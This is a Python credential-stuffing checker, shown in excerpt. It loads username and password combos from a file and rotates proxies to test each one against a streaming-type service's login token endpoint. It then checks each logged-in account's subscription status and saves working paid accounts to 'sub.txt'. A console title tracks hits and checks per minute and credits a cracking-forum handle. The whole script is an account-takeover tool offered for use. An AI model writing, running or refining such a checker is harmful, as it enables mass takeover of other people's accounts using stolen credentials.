import requests, threading, ctypes, random, time, colorama, os, base64
...
try:
    combo = open('combos.txt','r', encoding='utf-8', errors='ignore').read().splitlines()
    ...
    def title():
        while True:
            ctypes.windll.kernel32.SetConsoleTitleW(f'{total}/{checked} - Sub: {hits} - No Sub: {free} - Never Sub: {nosub} - Hit Ratio: {hit_ratio}% - CPM: {cpm} - Retries: {retries} - made by c.to/Zentred')
        ...
        for line in combo:
            for i in range(retry):
                try:
                    ...
                    r = req.post('https://zwyr157wwiu6eior.com/v1/users/tokens', data=data, headers=headers, proxies=random.choice(proxies), timeout=3)

                    if 'token' in r.text:
                        token = r.json()['token']
                        encoded_token = base64.b64encode(f'token:{token}'.encode("utf-8"))
                        ...
                        a = requests.get('https://zwyr157wwiu6eior.com/v1/users/services', headers=headers1, proxies=random.choice(proxies), timeout=5)
                        ...
                        if a.text == '[]':
                            ...
                            expiredate_year, expiredate_month, expiredate_day = expiredate[0], expiredate[1], expiredate[2]
                            datetime_year, datetime_month, datetime_day = datetimenow[0], datetimenow[1], datetimenow[2]

                            if int(expiredate_year) > int(datetime_year):
                                with open('sub.txt','a',encoding='utf-8',errors='ignore') as p:
                                    p.writelines(line+' - '+f'ExpireDate: {b}'+'\n')
                                hits += 1
